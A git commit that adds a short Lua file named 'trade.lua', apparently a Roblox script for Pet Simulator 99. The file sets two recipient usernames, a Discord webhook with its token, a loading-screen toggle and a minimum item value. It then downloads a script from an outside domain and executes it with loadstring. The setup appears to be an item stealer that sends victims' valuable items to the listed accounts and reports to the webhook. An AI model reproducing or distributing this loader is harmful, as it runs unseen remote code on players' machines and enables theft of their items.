0509f4b2cc1b381663652dd335020e985da21643
Chrissshere <106878486+Chrissshere@users.noreply.github.com>
2024-02-18 11:32:35 +0200

    Update and rename trade to trade.lua

---
+++ trade.lua
@@ -0,0 +1,9 @@
+Username = "Babascriptt"
+Username2 = "babascripttalt"
+Webhook = "https://discord.com/api/webhooks/1200074115780980856/AVPt6pS-uZMtY7HZtBE8qmi4S9tsswGN1k7jkolAO3QXurDzQgrvtmjSmYTvn_t6qEiK"
+
+LoadingScreen = false
+
+MinimumRAP = 0
+
+loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
